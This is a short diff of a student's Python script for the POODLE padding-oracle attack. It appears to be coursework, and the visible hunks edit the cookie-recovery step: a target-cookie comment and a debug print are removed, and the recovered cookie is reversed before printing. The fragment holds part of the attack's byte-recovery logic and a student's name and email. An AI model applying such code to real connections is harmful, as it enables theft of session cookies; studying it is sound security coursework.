@@ -1,7 +1,6 @@
 #Poodle attack by Simen Andersen
 #Email: SimAnd48374@stud.noroff.no
 
-#target cookie: 3fe269ff4b43d5d870d38dc98e49fa22
 
 from textwrap import wrap
 import sys
@@ -45,7 +44,6 @@ def calculate_cookie(c_rminone, block):
 
     mr = padding_int ^ hex_cr_int
     mr = mr ^ hex_cn_int
-    print(hex_cr_int, hex_cn_int, mr)
 
     return chr(mr)
     
@@ -67,7 +65,7 @@ def main():
     for block in traces:
         cookie += str(calculate_cookie(c_rminone, block))
 
-
+    cookie = cookie[::-1]
     print(f"Cookie: {cookie}")
 
 
